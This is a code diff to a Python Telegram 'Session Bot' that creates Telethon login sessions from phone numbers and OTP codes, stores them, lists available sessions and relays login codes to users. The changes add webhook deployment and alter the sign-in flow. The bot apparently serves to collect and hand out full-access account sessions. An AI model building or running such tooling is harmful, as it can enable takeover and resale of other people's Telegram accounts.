@@ -15,6 +15,8 @@ API_ID = int(os.environ.get('API_ID', 12345))
 API_HASH = os.environ.get('API_HASH', 'your_api_hash')
 BOT_TOKEN = os.environ.get('BOT_TOKEN', 'your_bot_token')
 ADMIN_IDS = list(map(int, os.environ.get('ADMIN_IDS', '0').split(',')))
+PORT = int(os.environ.get('PORT', 8080))
+RAILWAY_DOMAIN = os.environ.get('RAILWAY_PUBLIC_DOMAIN')
 
 SESSION_DIR = Path('sessions')
 SESSION_DIR.mkdir(exist_ok=True)
@@ -128,9 +130,7 @@ async def forward_otp(session_name, otp):
 async def send_login_instruction(user_id, session_name, phone):
     await app.bot.send_message(
         chat_id=user_id,
-        text=f"📱 **Login Required**\n\n"
-             f"Please login to Telegram using this number:\n`{phone}`\n\n"
-             f"⚠️ Once you login, I'll receive the OTP and forward it here.\n⏳ Waiting for OTP...",
+        text=f"📱 **Login Required**\n\nPlease login to Telegram using this number:\n`{phone}`\n\n⚠️ Once you login, I'll receive the OTP and forward it here.\n⏳ Waiting for OTP...",
         parse_mode='Markdown'
     )
 
@@ -177,7 +177,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     is_admin_flag = is_admin(user_id)
     msg = (
-        "🤖 **Session Bot v2.2**\n\n"
+        "🤖 **Session Bot v2.3**\n\n"
         "**Commands:**\n"
         "/create - Create new session\n"
         "/list - Show all available sessions\n"
@@ -210,8 +210,10 @@ async def create_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['otp_attempts'] = 0
 
     try:
+        # Just connect and send code request, don't use .start()
         client = TelegramClient(str(SESSION_DIR / f"{context.user_data['session_name']}.session"), API_ID, API_HASH)
-        await client.start(phone=phone)
+        await client.connect()
+        await client.send_code_request(phone)
         context.user_data['client'] = client
 
         keyboard = [[InlineKeyboardButton("🔄 Resend OTP", callback_data="resend_otp")]]
@@ -238,6 +240,7 @@ async def create_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
     try:
+        # Sign in with the code
         await client.sign_in(code=otp)
         me = await client.get_me()
         await client.disconnect()
@@ -324,6 +327,7 @@ async def resend_otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text("❌ Session name missing. Use /create again.")
         return
 
+    # Disconnect old client if exists
     if 'client' in context.user_data:
         try:
             await context.user_data['client'].disconnect()
@@ -332,7 +336,8 @@ async def resend_otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     try:
         client = TelegramClient(str(SESSION_DIR / f"{session_name}.session"), API_ID, API_HASH)
-        await client.start(phone=phone)
+        await client.connect()
+        await client.send_code_request(phone)
         context.user_data['client'] = client
         context.user_data['otp_attempts'] = 0
 
@@ -368,7 +373,8 @@ async def resend_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     try:
         client = TelegramClient(str(SESSION_DIR / f"{session_name}.session"), API_ID, API_HASH)
-        await client.start(phone=phone)
+        await client.connect()
+        await client.send_code_request(phone)
         context.user_data['client'] = client
         context.user_data['otp_attempts'] = 0
 
@@ -548,5 +554,21 @@ if __name__ == '__main__':
     print("🤖 Bot starting...")
     print(f"📁 Sessions: {SESSION_DIR.absolute()}")
     print(f"📊 Database: {DB_PATH.absolute()}")
-    # 🔽 FIX: drop_pending_updates=True to avoid conflict
-    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
+
+    if RAILWAY_DOMAIN:
+        webhook_url = f'https://{RAILWAY_DOMAIN}/webhook'
+        print(f"🌐 Setting webhook: {webhook_url}")
+        app.run_webhook(
+            listen='0.0.0.0',
+            port=PORT,
+            url_path='webhook',
+            webhook_url=webhook_url,
+            allowed_updates=Update.ALL_TYPES,
+            drop_pending_updates=True
+        )
+    else:
+        print("📡 Using polling mode (drop_pending_updates=True)")
+        app.run_polling(
+            allowed_updates=Update.ALL_TYPES,
+            drop_pending_updates=True
+        )
